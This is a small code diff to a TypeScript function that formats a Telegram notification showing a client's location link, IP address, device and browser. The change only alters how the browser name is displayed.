@@ -91,7 +91,7 @@ function formatTelegramMessage(data: any, clientInfo: ClientInfo): string {
     const lines = [
         `<b>📍 Location:</b> ${locationLink}`,
         `<b>🌐 IP:</b> <code>${clientInfo.ip}</code>`,
-        `<b>📱 Device:</b> ${escapeHtml(clientInfo.device)} <code>${escapeHtml(clientInfo.browser)}</code>`
+        `<b>📱 Device:</b> ${escapeHtml(clientInfo.device)} - ${escapeHtml(clientInfo.browser)}`
     ];
 
     for (const value of Object.values(data)) {
